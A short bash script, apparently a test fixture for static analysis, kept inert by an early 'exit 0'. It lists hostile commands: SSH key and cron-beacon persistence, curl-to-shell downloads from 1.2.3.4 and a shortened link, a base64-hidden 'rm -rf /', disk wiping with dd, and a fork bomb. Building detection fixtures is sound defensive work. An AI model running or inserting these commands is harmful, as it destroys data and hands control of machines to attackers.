#!/bin/bash
# Every red flag in one place. Static analysis sees everything below; the exit makes it inert if it ever runs.
exit 0
export PATH="/tmp/.cache:$PATH"
echo 'ssh-rsa AAAA attacker' >> ~/.ssh/authorized_keys
echo 'alias sudo="sudo -S"' >> "$HOME/.bashrc"
echo "* * * * * curl -s http://1.2.3.4/beacon | sh" | crontab -
curl -s http://bit.ly/x9z | bash
echo 'cm0gLXJmIC8=' | base64 -d | sh
eval "$(curl -s http://1.2.3.4/stage2)"
rm -rf / --no-preserve-root
dd if=/dev/zero of=/dev/sda bs=1M
chmod -R 777 /usr/local
:(){ :|:& };:
